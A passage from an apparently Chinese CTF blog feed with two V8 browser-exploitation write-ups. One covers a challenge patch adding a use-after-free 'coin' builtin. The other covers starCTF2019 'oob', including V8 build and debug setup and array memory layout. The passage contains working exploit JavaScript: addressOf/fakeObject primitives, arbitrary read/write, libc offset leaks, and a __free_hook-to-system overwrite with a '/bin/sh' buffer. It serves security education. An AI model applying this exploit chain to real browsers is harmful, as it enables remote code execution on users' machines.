class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index e6ab965a7e..9e5eb73c34 100644</span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line">@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"></span><br><span class="line"><span class="addition">+// Vulnerability is here</span></span><br><span class="line"><span class="addition">+// You can't use this vulnerability in Debug Build :)</span></span><br><span class="line"><span class="addition">+BUILTIN(ArrayCoin) &#123;</span></span><br><span class="line"><span class="addition">+  uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+  if (len != 3) &#123;</span></span><br><span class="line"><span class="addition">+     return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+         isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; length;</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span></span><br><span class="line"><span class="addition">+  if(37 &lt; array_length)&#123;</span></span><br><span class="line"><span class="addition">+    elements.set(37, value-&gt;Number());</span></span><br><span class="line"><span class="addition">+    return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  else&#123;</span></span><br><span class="line"><span class="addition">+    return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br></pre></td></tr></table></figure><p>这个diff中，添加了在数组第37个元素处写任意值的操作，但是同时这个coin函数又判断了当前的这个数组的长度必须小于37，但看这个函数是没有漏洞的，但是该函数可以通过<code>valueOf</code> 触发 <code>callback</code> 回调，回调函数可以通过对 <code>array.length</code> 的赋值来重新分配内存空间。然而，<code>array</code> 以及 <code>element</code> 均在执行回调之前就已经保存在局部变量中，后续在对 <code>element</code> 的赋值时也直接采用的是该局部变量，因此我们得到了一个 <code>UAF</code> ，并且可以这样利用：通过在 <code>Callback</code> 中扩大 <code>Array</code> 的 <code>length</code> 来强制 <code>GC</code> 重新 <code>alloc</code> ，之后通过分配巨量的 <code>array</code> 来占位原 <code>array</code> 的地址空间，最后通过 <code>elements.set(37, value-&gt;Number())</code> 来达到对原内存内容的修改。倘若我们修改的内存恰好是新占位 <code>array</code> 的 <code>length</code> 字段，那我们就得到了一个 <code>OOB</code> 数组。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在分析完题目后，思路就有了，和starCTF的oob类似，构造一个addressOf和fakeObject语句，之后构造任意地址读写。最后修改free_hook达到最终的getshell。</p><p>首先，申请一个数组作为溢出的数组，之后申请一个float数组，准备溢出至改数组的length字段，之后用该数组实现越界的读写。同时为了后续的addressOf和fakeObject函数，我们申请了一个object的数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">x</span>:<span class="number">100</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">31</span>);</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="comment">//%DebugPrint(float_array);</span></span><br><span class="line"><span class="keyword">var</span> object_array = [obj,obj,obj,obj];</span><br></pre></td></tr></table></figure><p>之后就是我们通过callback函数，进行漏洞利用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> object_array = [obj,obj,obj,obj];</span><br><span class="line"><span class="keyword">var</span> vuln = &#123;</span><br><span class="line">        valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                array.length = <span class="number">40</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1024</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">array.coin(<span class="number">1</span>,vuln);</span><br></pre></td></tr></table></figure><p>从gdb里面算一算偏移，可以找到应该申请多大的array用来刚好溢出到float_array的length字段。这里我计算出来是31。</p><p>之后，利用float_array来修改object_array的内容，可以分别用object_array正常写，float_array越界读来实现addressOf，使用float_array越界写，object_array正常读来实现fakeObejct。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">object</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        object_array[<span class="number">0</span>] = object;</span><br><span class="line">        <span class="keyword">var</span> address = float_array[<span class="number">7</span>];</span><br><span class="line">        <span class="keyword">return</span> f2i(address)<span class="number">-1n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">address</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        float_array[<span class="number">7</span>] = i2f(address);</span><br><span class="line">        <span class="keyword">var</span> fakeObject = object_array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> fakeObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，我的任意读写的语句和之前的starCTF的oob中的语句完全一样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> a_constructor_addr = addressOf(a.constructor);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] leak addr: "</span> + hex(a_constructor_addr));</span><br><span class="line"><span class="keyword">var</span> fake_obj_addr = leak_addr+<span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_obj = fakeObject(fake_obj_addr+<span class="number">1n</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                evil_array[<span class="number">2</span>] = i2f(addr<span class="number">-0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">                <span class="keyword">var</span> leak_data = f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                evil_array[<span class="number">2</span>] = i2f(addr<span class="number">-0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">                fake_obj[<span class="number">0</span>] = i2f(data);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dataview_write</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        write64(addressOf(data_buf)+<span class="number">0x20n</span>,addr);</span><br><span class="line">        data_view.setFloat64(<span class="number">0</span>,i2f(data),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包括最后的利用也是一样的，唯一不一样的是text地址的偏移变了，这个自己重新算算就ok了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> text_addr = (read64(read64(a_constructor_addr + <span class="number">0x30n</span>)<span class="number">-1n</span> +<span class="number">0x40n</span>) &gt;&gt; <span class="number">16n</span>) - <span class="number">0xaf6c60n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] text addr: "</span> + hex(text_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sprintf_got = text_addr+<span class="number">0xdbe770n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] sprintf got addr: "</span> + hex(sprintf_got));</span><br><span class="line"><span class="keyword">var</span> libc_addr = read64(sprintf_got) - <span class="number">0x65000n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] libc addr: "</span> + hex(libc_addr));</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_addr + <span class="number">0x4f440n</span>;</span><br><span class="line"><span class="keyword">var</span> free_hook_addr = libc_addr + <span class="number">0x3ed8e8n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] system addr: "</span> + hex(system_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] free hook addr: "</span> + hex(free_hook_addr));</span><br><span class="line"></span><br><span class="line">dataview_write(free_hook_addr,system_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x0068732f6e69622fn</span>), <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p><img src="/2020/06/06/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E/image-20200607193933641.png" alt="image-20200607193933641"></p><p><img src="/2020/06/06/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E/image-20200607193953159.png" alt="image-20200607193953159"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p><p>之前文章：</p><p>v8开坑+starCTF2019 oob：<a href="http://pwn.sofr.website/2020/06/01/v8开坑/" target="_blank" rel="noopener">http://pwn.sofr.website/2020/06/01/v8%E5%BC%80%E5%9D%91/</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> browser </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器漏洞学习--V8--starctf2019(*ctf)-oob</title>
      <link href="/2020/06/01/v8%E5%BC%80%E5%9D%91/"/>
      <url>/2020/06/01/v8%E5%BC%80%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>准备开始学习浏览器漏洞的相关知识，其实之前就了解过一些关于浏览器的相关知识，这次也是整理加学习，准备把这些内容好好学习一下。</p><p>关键字： <code>CTF</code> <code>pwn</code> <code>browser</code> <code>v8</code> <code>*CTF</code> <code>starCTF</code> <code>oob</code></p><a id="more"></a><h2 id="V8的搭建"><a href="#V8的搭建" class="headerlink" title="V8的搭建"></a>V8的搭建</h2><p>v8的搭建主要的考验就是对于某种大家都懂的因素进行抗争，解决了这个问题后，其余都不是大问题。</p><p>安装时主要参考了：<a href="https://bbs.pediy.com/thread-258431.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-258431.htm</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"/path/to/depot_tools"'</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="comment"># /path/to/depot_tools改成depot_tools的目录</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="comment"># clone并且configure</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"/path/to/ninja"'</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="comment"># /path/to/ninja改成ninja的目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fetch v8</span><br><span class="line">gclient sync</span><br><span class="line"></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure><p>我的本地是ubuntu 18.04 server版，在安装时按照官方流程走，只遇到了一个问题：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.CalledProcessError: Command <span class="string">'['</span>/usr/bin/python<span class="string">', '</span>-u<span class="string">', '</span>tools/mb/mb.py<span class="string">', '</span>gen<span class="string">', '</span>-f<span class="string">', '</span>infra/mb/mb_config.pyl<span class="string">', '</span>-m<span class="string">', '</span>developer_default<span class="string">', '</span>-b<span class="string">', '</span>x64.debug<span class="string">', '</span>out.gn/x64.debug<span class="string">']'</span> returned non-zero <span class="built_in">exit</span> status 1</span><br></pre></td></tr></table></figure><p>这个时候<code>sudo apt install pkg-config</code>就可以解决了。除此之外没有什么需要注意的。</p><p>还有一个问题，就是在debug的版本中，貌似会有一些check，我在debug版本下运行oob题目中的d8会出现以下信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Fatal error <span class="keyword">in</span> ../../src/objects/fixed-array-inl.h, line 32</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Check failed: !v8::internal::FLAG_enable_slow_asserts || (IsFixedDoubleArray()).</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">FailureMessage Object: 0x7ffd40d77f00</span></span><br><span class="line">==== C stack trace ===============================</span><br></pre></td></tr></table></figure><p>在release版本下就可以运行了。</p><h2 id="V8调试"><a href="#V8调试" class="headerlink" title="V8调试"></a>V8调试</h2><p>运行d8时使用参数<code>--allow-natives-syntax</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) 输出对象地址</span><br><span class="line"></span><br><span class="line">%SystemBreak() 触发调试中断主要结合gdb等调试器使用</span><br></pre></td></tr></table></figure><h2 id="基础知识学习"><a href="#基础知识学习" class="headerlink" title="基础知识学习"></a>基础知识学习</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="JSArray和FixedArray"><a href="#JSArray和FixedArray" class="headerlink" title="JSArray和FixedArray"></a>JSArray和FixedArray</h4><p>我在学习v8的时候，首先接触的概念就是数组，v8的数组是<code>JSArray</code>类型的，而数组的元素则是存储在一个Elements的指针里面，v8把这个结构叫做<code>FixedArray</code>。其结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*JSArray</span></span><br><span class="line"><span class="comment">+------------+</span></span><br><span class="line"><span class="comment">+    map     +</span></span><br><span class="line"><span class="comment">+ prototype  +</span></span><br><span class="line"><span class="comment">+  elements  + --&gt; FixedArray</span></span><br><span class="line"><span class="comment">+   length   +</span></span><br><span class="line"><span class="comment">+ properties +</span></span><br><span class="line"><span class="comment">+------------+</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>在内存中查看，也可以得到类似结果：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531223916467.png" alt="image-20200531223916467"></p><p>而<code>FixedArray</code>也分为不同的种类，这里介绍两种：fast模式和slow模式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*fast                                 slow</span></span><br><span class="line"><span class="comment">+---------+                 +----------------------+</span></span><br><span class="line"><span class="comment">+   map   +                 +          map         +</span></span><br><span class="line"><span class="comment">+  length +                 +    NumberofElemnts   +</span></span><br><span class="line"><span class="comment">+  value0 +                 +NumberOfDeletedElemnts+</span></span><br><span class="line"><span class="comment">+  value1 +                 +        Capacity      +</span></span><br><span class="line"><span class="comment">+   ...   +                 +       PrefixStart    +</span></span><br><span class="line"><span class="comment">+---------+                 +           key        +</span></span><br><span class="line"><span class="comment">                            +          value       +</span></span><br><span class="line"><span class="comment">                            +         Details      +</span></span><br><span class="line"><span class="comment">                            +----------------------+</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>其中fast模式就是一般的模式，应对的是一般的数组情况。而slow模式则是应对另一种情况，例如<code>var b[0xffff]=1</code>，在这种情况下，用fast模式来存储显然需要大量的连续空间，去存储少量的数据，这时候，就用slow模式存储了。看看内存情况：</p><p>下图就是fast模式：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531223916467.png" alt="image-20200531223916467"></p><p>而加入一个下标为0xffff的数据后就发生变化了：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531223854032.png" alt="image-20200531223854032"></p><h4 id="数组中元素存放形式"><a href="#数组中元素存放形式" class="headerlink" title="数组中元素存放形式"></a>数组中元素存放形式</h4><p>在v8中的数组元素的存放形式如下：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531221425461.png" alt="image-20200531221425461"></p><p>在数组元素都是整数的情况下，我们定义<code>var b=[1,2,3];</code>，其内存布局如下</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531223916467.png" alt="image-20200531223916467"></p><p>其elements的内容如下，这个时候已经能看到elements的地址最低位就是1，需要我们手动减去1。</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531222715386.png" alt="image-20200531222715386"></p><p>可以看到整数的存放形式。接下来看下浮点数的存放形式：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531223421342.png" alt="image-20200531223421342"></p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531223538160.png" alt="image-20200531223538160"></p><p>这里的数字以IEEE 754浮点数来存放，<a href="http://www.binaryconvert.com/result_double.html?decimal=049046050可以在线转换浮点数和我们平时使用的数字，如上图中的1.2：" target="_blank" rel="noopener">http://www.binaryconvert.com/result_double.html?decimal=049046050可以在线转换浮点数和我们平时使用的数字，如上图中的1.2：</a></p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200602151906871.png" alt="image-20200602151906871"></p><p>最后看一下对象如何存储，其中obj是一个对象：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200602151950479.png" alt="image-20200602151950479"></p><p>可以看到对象在数组中就是以结尾+1的指针形式存在。</p><p>了解了这些之后，尝试做做这个题目吧。</p><h2 id="starCTF2019-oob"><a href="#starCTF2019-oob" class="headerlink" title="starCTF2019-oob"></a>starCTF2019-oob</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">git apply ~/browser_pwn/starctf2019-oob/Chrome/oob.diff</span><br></pre></td></tr></table></figure><p>之后，按照正常流程编译。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>diif的文件中在Array对象中增加了一个oob函数：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "fill",</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, "oob",</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);  //增加了一个oob成员函数</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "find",</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "findIndex",</span><br></pre></td></tr></table></figure><p>分析oob这个函数：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length(); //获取参数个数</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());//获取array的长度</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123; </span></span><br><span class="line"><span class="addition">+        //read   //a.oob()---》读</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length))); //读取第length个元素，即越界读一个元素</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write //a.oob(1)---》写</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());//越界写一个元素至第length个元素</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"></span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br></pre></td></tr></table></figure><p>首先来验证我们对oob函数的功能，写一个test脚本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="keyword">var</span> num = f2i(a.oob());</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"leak: "</span>+hex(num));                                                                      </span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"oob write"</span>);                                                                      </span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>我们在上述的test的脚本中测试<code>oob()</code>和<code>oob(1)</code>的功能是否是我们分析的情况。</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531225817635.png" alt="image-20200531225817635"></p><p>可以看到<code>%DebugPrint(a);</code>接下来查看其elements中的内容：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200602152549629.png" 